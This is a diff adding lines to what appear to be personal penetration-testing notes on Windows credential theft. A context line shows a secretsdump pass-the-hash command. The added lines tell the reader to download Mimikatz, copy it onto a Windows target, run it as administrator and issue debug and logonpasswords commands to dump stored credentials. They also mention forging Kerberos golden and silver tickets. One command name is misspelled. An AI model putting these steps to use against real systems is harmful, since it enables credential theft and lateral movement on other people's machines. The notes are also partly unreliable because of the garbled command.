@@ -19,3 +19,14 @@ secretsdump administrator@10.1.1.1 -hashes NTLM:HASH   //local user hash //also 
 
 
 **Mimikatz**: https://wadcoms.github.io/   https://hackviser.com/tactics/tools/mimikatz  
+tool to steal creds, generate kerberos tickets, pass hash attacks, silver and golden ticket attacks  
+Use it where possible – Windows only -- very powerfull !!  covers more than secretsdump and cme  
+
+Download from github gentilkiwi  
+Download the latest mimikatz-trunk.zip  
+Extract them on kali  
+copy the 4 files into the windows target machine  or if you can downLoad it from github straight even better  
+Open cmd as administartor and execute the mimikatz.exe  
+
+Privilege::debug  //debug mode 
+Securlsa::logonpasswords   //dump creds  
